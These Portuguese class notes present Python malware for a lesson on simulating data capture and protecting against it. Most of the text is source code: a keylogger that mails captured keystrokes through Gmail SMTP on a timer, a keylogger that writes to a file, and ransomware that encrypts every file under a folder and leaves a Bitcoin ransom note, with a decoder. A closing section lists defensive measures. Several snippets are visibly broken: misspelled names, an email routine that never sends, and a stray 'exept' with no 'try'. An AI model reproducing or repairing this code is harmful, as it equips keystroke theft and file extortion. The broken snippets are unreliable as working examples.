# Códigos 


Resumo da aula "Simulando um Malware de Captura de Dados Simples em Python e Aprendendo a se Proteger"


## keylogger.pyw :
preparações : 
```bash
pip install pynput --break-system-packages
pip install secure-smtplib --break-system-packages
```


### Com E-mail
```python
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# Inserir E-Mail
ORIGEM = ""
DESTINO = ""
SENHA = "" # precisa do código da autenticação de dois fatores

def enviar_email():
    global log
    if log:
        msg = MIMEtext(log)
        msg['SUBJECT'] = "Dados coletados"
        msg['FROM'] = ORIGEM
        msg['TO'] = DESTINO
        try:
            server = smtlib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(ORIGEM, SENHA)
            server.quit()
        except Exception as e: 
            print("Erro ao enviar", e)
    log = ""
    # Agendando o envio (em segundos)
    Timer(60, DESTINO).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log += " [<<] "
        else:
            pass # ignorar o resto das teclas
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
```


### Sem E-mail
```python
from pynput import keyboard

IGNORE = {
    keyboard.key.shift,
    keyboard.key.shift_r,
    keyboard.key.ctrl_l,
    keyboard.key.ctrl_r,
    keyboard.key.alt_r,
    keyboard.key.alt_l,
    keyboardInterrupt.Key.caps_lock,
    keyboard.key.cmd
}

def on_press(key):
    # Tecla normal
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(key.char)
    exept AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("\n [DELETED] \n")
            elif key == keyboard.Key.esc: 
                f.write("[ESC]")
            elif key in IGNORE:
                pass
            else:
                f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```


## Ransomware.py


Preparação

```bash
pip install cryptography --break-system-packages 
```

### Encoder 

```python
from  cryptography.fernet import Fernet
import os

# Gerar uma chave 

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# Carregar a chave

def carregar_chave():
    return open("chave.key", "rb").read()

# Criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# Encontrar arquivos 

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

# Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcon para o endereco X e envie o comprovante!\n")
        f.write("Depois disso enviaremos a chave para recuperar seus dados")

# Execucao do codigo

def main(): 
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("testfiles")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware Executado!")


if __name__ =="__main__":
    main()
```

### Decoder 


```python
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open ("chave.key", "rb").read()

def descriptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos descriptografados com sucesso!")

if __name__ == "__main__":
    main ()
```

# Medidas de proteção/prevenção e defesa


### Contra Keyloggers (Captura de Dados)

- Utilize um Gerenciador de Senhas: Use gerenciadores de senhas confiáveis (como LastPass, 1Password ou Bitwarden) para preencher credenciais automaticamente, reduzindo a necessidade de digitá-las, o que dificulta a captura por keyloggers baseados em hooks do teclado.

- Habilite a Autenticação de Dois Fatores (2FA): Mesmo que a senha seja capturada, o 2FA impede o acesso à conta sem o segundo fator (código temporário, token ou chave física).

- Mantenha o Antivírus Atualizado: Softwares antivírus e soluções de EDR (Endpoint Detection and Response) podem identificar e bloquear a execução de keyloggers conhecidos ou seu comportamento suspeito.

- Use Teclados Virtuais: Em dispositivos comprometidos, usar um teclado virtual (na tela) pode burlar keyloggers baseados na captura de eventos do teclado físico.

### Contra Ransomware (Criptografia de Arquivos)

- Realize Backups Regularmente:
1. Cópias dos seus dados.
2. Em 2 Mídias de armazenamento diferentes (ex: disco interno e externo).
3. 1 Cópia Off-site ou Offline (desconectada da rede/nuvem) para que o ransomware não consiga criptografá-la.

- Mantenha o Sistema Operacional e Aplicativos Atualizados: As atualizações corrigem vulnerabilidades de segurança exploradas por malwares para se infiltrarem no sistema.

- Seja Cauteloso com E-mails e Downloads: Nunca abra anexos ou clique em links de e-mails de remetentes desconhecidos ou suspeitos, pois são o vetor de ataque mais comum para ransomware.

- Utilize Contas de Usuário com Menos Privilégios (Standard User): Limitar as permissões de acesso do usuário no dia a dia impede que o ransomware se espalhe para áreas críticas do sistema ou rede.

### Boas Práticas Gerais

- Educação em Segurança: A conscientização do usuário é a principal linha de defesa.

- Firewall: Mantenha o firewall do sistema operacional (ou de rede) ativo para monitorar e bloquear tráfego suspeito.

- Monitoramento de Processos: Fique atento a processos desconhecidos consumindo recursos do sistema de forma atípica.